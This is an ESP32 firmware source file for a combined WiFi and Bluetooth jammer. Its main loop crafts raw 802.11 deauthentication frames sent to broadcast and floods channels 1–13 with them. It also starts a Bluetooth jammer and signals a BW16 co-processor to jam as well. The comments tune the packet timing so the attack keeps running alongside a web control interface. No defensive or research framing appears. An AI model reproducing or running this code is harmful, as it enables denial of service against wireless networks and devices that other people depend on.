/*
 * attack_jammer.c — Fixed WiFi + Bluetooth Jammer
 * 
 * FIXED: HTTP server crash prevented (select error 22)
 * FIXED: Proper WiFi AP config with SSID
 * FIXED: Balanced delay between packets
 * FIXED: Core affinity set to avoid httpd conflict
 */

#include "attack_jammer.h"
#include "attack_bluetooth_jammer.h"
#include "bw16_uart.h"
#include "wifi_controller.h"
#include "esp_rom_sys.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "JAMMER";

static TaskHandle_t jammer_task = NULL;
static volatile bool jammer_wifi_running = false;
static volatile bool jammer_bt_running = false;
static volatile uint64_t jammer_packets = 0;

// FIX: Keep a reference to the AP config to maintain WiFi interface
static void ensure_jammer_wifi_mode(void) {
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    
    if (current_mode != WIFI_MODE_AP && current_mode != WIFI_MODE_APSTA) {
        ESP_LOGW(TAG, "WiFi mode %d not suitable. Switching to APSTA...", current_mode);
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(200));
        
        // FIX: Must set a valid AP config to keep the WiFi interface alive
        wifi_config_t ap_cfg = {
            .ap = {
                .ssid = "JAM",
                .ssid_len = 3,
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 1,
                .beacon_interval = 500,
            }
        };
        esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        esp_wifi_start();
        vTaskDelay(pdMS_TO_TICKS(300));
    }
}

static void jammer_wifi_func(void *params) {
    jammer_wifi_running = true;
    
    // FIX: Ensure proper WiFi mode at start
    ensure_jammer_wifi_mode();
    
    ESP_LOGI(TAG, "🔥 WiFi Jammer started — flooding all channels 1-13");

    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
    int ch = 1;

    if (bw16_is_connected()) {
        bw16_jammer_start();
        bw16_send_command("JAMMER:START\n");
    }

    int cycle = 0;
    while (jammer_wifi_running) {
        // Switch to channel
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_rom_delay_us(100);

        // Deauth packet
        uint8_t deauth_pkt[26] = {
            0xC0, 0x00,
            0x00, 0x00,
            broadcast[0], broadcast[1], broadcast[2],
            broadcast[3], broadcast[4], broadcast[5],
            bssid[0], bssid[1], bssid[2],
            bssid[3], bssid[4], bssid[5],
            bssid[0], bssid[1], bssid[2],
            bssid[3], bssid[4], bssid[5],
            0x00, 0x00,
            0x07, 0x00
        };

        // FIX: Send 5 packets per channel (reduced from 10 for stability)
        for (int i = 0; i < 5; i++) {
            esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
            if (ret == ESP_OK) {
                jammer_packets++;
            }
        }

        ch = (ch % 13) + 1;  // Cycle channels 1-13
        cycle++;

        // FIX: Critical - increase delay to 50ms to prevent httpd select error
        // This gives the HTTP server time to process requests
        vTaskDelay(pdMS_TO_TICKS(50));

        // FIX: Every 20 cycles, yield longer to prevent watchdog
        if (cycle % 20 == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            ESP_LOGD(TAG, "Jammer alive: %llu packets sent", jammer_packets);
        }
    }

    if (bw16_is_connected()) {
        bw16_send_command("JAMMER:STOP\n");
    }

    jammer_wifi_running = false;
    jammer_task = NULL;
    ESP_LOGI(TAG, "WiFi Jammer stopped. Total packets: %llu", jammer_packets);
    vTaskDelete(NULL);
}

void jammer_wifi_start(void) {
    if (jammer_wifi_running) {
        ESP_LOGW(TAG, "WiFi jammer already running");
        return;
    }
    
    // FIX: Create task on core 0 (same as httpd) but with lower priority
    // Actually better: run on core 1 to not block httpd on core 0
    xTaskCreatePinnedToCore(jammer_wifi_func, "jammer_wifi", 4096, NULL, 
                            4,  // FIX: Priority 4 (lower than httpd which is typically 5)
                            &jammer_task, 1);  // FIX: Run on core 1
    ESP_LOGI(TAG, "WiFi jammer task created (core 1, prio 4)");
}

void jammer_bt_start(void) {
    if (jammer_bt_running) {
        ESP_LOGW(TAG, "BT jammer already running");
        return;
    }
    bt_jammer_start();
    jammer_bt_running = true;
    ESP_LOGI(TAG, "BT Jammer started");
}

void jammer_stop(void) {
    jammer_wifi_running = false;
    jammer_bt_running = false;
    bt_jammer_stop();
    if (bw16_is_connected()) {
        bw16_send_command("STOP\n");
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    ESP_LOGI(TAG, "All jammers stopped. Packets sent: %llu", jammer_packets);
}

bool jammer_wifi_is_running(void) {
    return jammer_wifi_running;
}

bool jammer_bt_is_running(void) {
    return jammer_bt_running;
}

uint64_t jammer_get_packets(void) {
    return jammer_packets;
}
